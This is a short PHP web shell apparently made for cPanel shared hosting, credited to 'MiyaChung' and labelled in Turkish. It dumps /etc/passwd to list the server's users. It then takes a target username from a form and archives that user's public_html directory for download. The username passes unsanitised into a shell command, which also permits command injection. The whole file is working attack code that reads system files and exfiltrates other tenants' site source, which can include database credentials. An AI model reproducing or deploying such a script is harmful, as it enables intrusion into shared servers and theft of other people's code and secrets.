<center>
<title>Script �ekici - [MiyaChung]</title>
<form method="post" action="">
<?php
$passwd=shell_exec("cat /etc/passwd"); echo "<textarea cols='85' rows='17'>"; echo $passwd."\n"; echo "</textarea>";
?>
<br>Hedef Username (ex:miyachung) : <br><input type="text" name="user"><br>
<input type="submit" name="submit" value="�ek"><br>
coded by <b>MiyaChung</b>
</form>
</center>
<?php
# Script �ekici
# Coded By MiyaChung
# Contact : MiyaChung@hotmail.com
# Cpanel olan serverlarda (/home/user/public_html)
ob_start();
set_time_limit(0);
class ceker{

public function script($hedef){

$phpself=dirname(__FILE__);
$cek=shell_exec("cd /home/".$hedef."/public_html/;tar cvzf ".$phpself."/".$hedef.".tar.gz *");

echo "<center><a href='".$hedef.".tar.gz'>".$hedef.".tar.gz</a></center>";
ob_flush();
flush();

}

}
if(isset($_POST['submit'])){
$ceker=new ceker();

$ceker->script($_POST['user']);
}

?>